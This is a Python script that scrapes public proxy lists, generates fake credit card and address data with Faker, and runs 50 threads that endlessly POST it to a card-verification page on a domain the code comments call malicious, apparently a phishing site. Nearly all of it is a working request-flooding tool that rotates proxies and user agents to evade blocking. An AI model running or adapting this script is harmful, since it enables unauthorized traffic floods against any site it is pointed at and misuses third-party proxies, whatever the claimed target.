import random
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from faker import Faker
import threading
fake = Faker()

# a malicious website
target = '107.150.4.187'
attack_num = 0
ua = UserAgent() # From here we generate a random user agent
proxies = [] # Will contain proxies [ip, port]

# Retrieve latest proxies
proxies_req = requests.get('https://www.sslproxies.org/').text

soup = BeautifulSoup(proxies_req, 'html.parser')
proxies_table = soup.find("table", {"class": "table table-striped table-bordered"})



user_agent_list_mobile = (
    # android
    # 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
    # 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    # 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)',
    # # samsung
    # 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    # 'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    # iphone
    'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
    'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
    'Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
    'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1'
)

user_agent_list_desktop = (
   #Chrome
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
)

user_agent_list= user_agent_list_mobile

# Save proxies in the array
for row in proxies_table.tbody.find_all('tr'):
    proxies.append({
    'ip':   row.find_all('td')[0].string,
    'port': row.find_all('td')[1].string
    })

# Retrieve a random index proxy (we need the index to delete it if not working)
def random_proxy():
  return random.randint(0, len(proxies) - 1)

def fackpack():
    return {'uid':random.randrange(10**3,10**4),
            'card':fake.credit_card_number(),
            'name':fake.first_name()+' '+fake.last_name(),
            'date':fake.credit_card_expire(),
            'cvv':fake.credit_card_security_code(),
            'state': fake.country_code(),
            'zip': fake.postcode(),
            'city': fake.city(),
            'address1':fake.street_address(),
            'address2':" "
            }

def attack():

    while True:
        # user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': fake.user_agent(), "Accept-Language": "en-US, en;q=0.5"}
        proxy = random.choice(proxies)
        proxy_index = 0
        for n in range(1, 20):

            # Every 10 requests, generate a new proxy
            if n % 10 == 0:
                proxy_index = random_proxy()
                proxy = proxies[proxy_index]

            # Make the call
            try:
                req = requests.post(f"https://ususbvi.top/php/app/index/verify-card.php?t={random.randrange(10**13,10**14)}",
                           data=fackpack(),
                           headers=headers,
                           proxies={'http':proxy['ip'] + ':' + proxy['port']}
                           )
                global attack_num
                attack_num+=1
                print(f'success: #{attack_num}:' + req.text)
            except: # If error, delete this proxy and find another one
                # del proxies[proxy_index]
                print('Proxy ' + proxy['ip'] + ':' + proxy['port'] + ' detected.'+headers)
                proxy_index = random_proxy()
                proxy = proxies[proxy_index]

for i in range(50):
    thread = threading.Thread(target=attack)
    thread.start()